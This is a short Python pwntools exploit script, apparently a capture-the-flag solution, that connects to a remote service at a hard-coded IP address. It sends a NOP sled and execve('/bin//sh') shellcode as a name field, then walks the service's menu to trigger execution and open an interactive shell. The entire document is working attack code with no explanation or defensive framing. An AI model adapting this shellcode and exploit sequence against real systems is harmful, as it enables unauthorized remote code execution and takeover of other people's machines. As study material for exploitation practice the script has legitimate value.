from pwn import *

p = remote('158.160.54.25', '1337')

shellcode = b'\x90' * 40 + b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'

p.recvuntil(b'>> ')
p.sendline(b'1')
p.recvuntil(b'Enter name size: ')
p.sendline(b'100')
p.recvuntil(b'Enter name: ')
p.sendline(shellcode)
p.recvuntil(b'>> ')

p.sendline(b'3')
p.sendline(b'1')

p.sendline(b'4')
p.sendline(b'100')
p.interactive()